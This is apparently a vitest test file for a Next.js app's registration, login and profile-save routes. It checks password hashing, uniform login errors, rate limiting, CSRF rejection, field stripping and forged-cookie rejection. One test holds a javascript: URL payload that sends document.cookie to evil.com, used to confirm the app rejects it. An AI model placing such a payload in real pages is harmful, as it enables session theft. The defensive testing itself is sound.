// Маршруты API целиком: БД подменена хранилищем в памяти, cookie — объектом.
import { beforeEach, describe, expect, it, vi } from "vitest";

const jar = new Map<string, string>();
vi.mock("next/headers", () => ({
  cookies: async () => ({
    get: (name: string) => (jar.has(name) ? { value: jar.get(name) } : undefined),
    set: (name: string, value: string) => jar.set(name, value),
    delete: (name: string) => jar.delete(name),
  }),
}));

type Row = { id: string; email: string; handle: string; password_hash: string; profile: unknown };
const rows: Row[] = [];
const saved = vi.fn();
vi.mock("@/lib/profiles", async () => {
  class AccountTakenError extends Error {}
  return {
    AccountTakenError,
    findAccountByEmail: async (email: string) => rows.find((r) => r.email === email) ?? null,
    createAccount: async (email: string, handle: string, password_hash: string) => {
      if (rows.some((r) => r.email === email)) throw new AccountTakenError("Этот email уже зарегистрирован");
      if (rows.some((r) => r.handle === handle)) throw new AccountTakenError("Этот адрес уже занят");
      const id = `id-${rows.length + 1}`;
      rows.push({ id, email, handle, password_hash, profile: {} });
      return id;
    },
    getOwnerRow: async (id: string) => {
      const row = rows.find((r) => r.id === id);
      return { handle: row?.handle ?? "", profile: null };
    },
    saveOwnerProfile: async (id: string, profile: unknown) => saved(id, profile),
  };
});

const { POST: register } = await import("@/app/api/auth/register/route");
const { POST: login } = await import("@/app/api/auth/login/route");
const { PUT: putProfile } = await import("@/app/api/profile/route");
const { buildStarterProfile, emptyAnswers } = await import("@/lib/onboarding");

let ip = 0;
function req(body: unknown, contentType = "application/json") {
  return new Request("http://localhost/api", {
    method: "POST",
    headers: { "content-type": contentType, "x-forwarded-for": `10.0.0.${ip}` },
    body: typeof body === "string" ? body : JSON.stringify(body),
  });
}

const account = { email: "Anna@Example.com", password: "long-password", handle: "anna" };

beforeEach(() => {
  jar.clear();
  rows.length = 0;
  saved.mockClear();
  ip += 1; // у каждого теста свой «адрес», чтобы лимиты не мешали друг другу
});

describe("регистрация и вход", () => {
  it("регистрация выдаёт сессию, email приводится к нижнему регистру", async () => {
    const res = await register(req(account));
    expect(res.status).toBe(200);
    expect(rows[0].email).toBe("anna@example.com");
    expect(rows[0].password_hash).not.toContain("long-password");
    expect(jar.get("ryadom_session")).toMatch(/^id-1\.\d+\.[0-9a-f]{64}$/);
  });

  it("занятый адрес и служебное слово отклоняются", async () => {
    await register(req(account));
    jar.clear();
    const taken = await register(req({ ...account, email: "other@example.com" }));
    expect(taken.status).toBe(409);
    const reserved = await register(req({ ...account, email: "x@example.com", handle: "edit" }));
    expect(reserved.status).toBe(400);
    expect(jar.size).toBe(0);
  });

  it("неверный пароль и чужой email дают одинаковый ответ", async () => {
    await register(req(account));
    jar.clear();
    const wrong = await login(req({ email: account.email, password: "wrong-password" }));
    const unknown = await login(req({ email: "nobody@example.com", password: "wrong-password" }));
    expect(wrong.status).toBe(401);
    expect(unknown.status).toBe(401);
    expect(await wrong.json()).toEqual(await unknown.json());
    expect(jar.size).toBe(0);

    const ok = await login(req({ email: "ANNA@example.com", password: account.password }));
    expect(ok.status).toBe(200);
    expect(await ok.json()).toEqual({ handle: "anna" });
  });

  it("старые аккаунты без пароля войти не могут", async () => {
    rows.push({ id: "old", email: "old@example.com", handle: "old", password_hash: null as never, profile: {} });
    const res = await login(req({ email: "old@example.com", password: "anything-at-all" }));
    expect(res.status).toBe(401);
  });

  it("перебор паролей упирается в лимит", async () => {
    const statuses = [];
    for (let i = 0; i < 12; i++) {
      statuses.push((await login(req({ email: "a@b.ru", password: "x".repeat(8) }))).status);
    }
    expect(statuses.slice(0, 10).every((s) => s === 401)).toBe(true);
    expect(statuses.slice(10)).toEqual([429, 429]);
  });

  it("запрос не в JSON отклоняется (защита от CSRF через форму)", async () => {
    const res = await login(req("email=a@b.ru&password=12345678", "application/x-www-form-urlencoded"));
    expect(res.status).toBe(400);
  });
});

describe("сохранение профиля", () => {
  const profile = () => buildStarterProfile({ ...emptyAnswers, name: "Анна", topics: ["Тревога"] });
  const put = (body: unknown) => putProfile(req(body));

  it("без сессии — 401", async () => {
    expect((await put({ profile: profile() })).status).toBe(401);
    expect(saved).not.toHaveBeenCalled();
  });

  it("с сессией сохраняется проверенный профиль без лишних полей", async () => {
    await register(req(account));
    const res = await put({ profile: { ...profile(), injected: "<script>" } });
    expect(res.status).toBe(200);
    const [id, stored] = saved.mock.calls[0];
    expect(id).toBe("id-1");
    expect(stored).not.toHaveProperty("injected");
  });

  it("опасная ссылка не сохраняется", async () => {
    await register(req(account));
    const p = profile();
    p.doors.message.url = "javascript:fetch('//evil.com?c='+document.cookie)";
    const res = await put({ profile: p });
    expect(res.status).toBe(400);
    expect(saved).not.toHaveBeenCalled();
  });

  it("подделанная cookie не даёт доступа", async () => {
    await register(req(account));
    const [, expires, sig] = jar.get("ryadom_session")!.split(".");
    jar.set("ryadom_session", `id-2.${expires}.${sig}`);
    expect((await put({ profile: profile() })).status).toBe(401);
  });
});
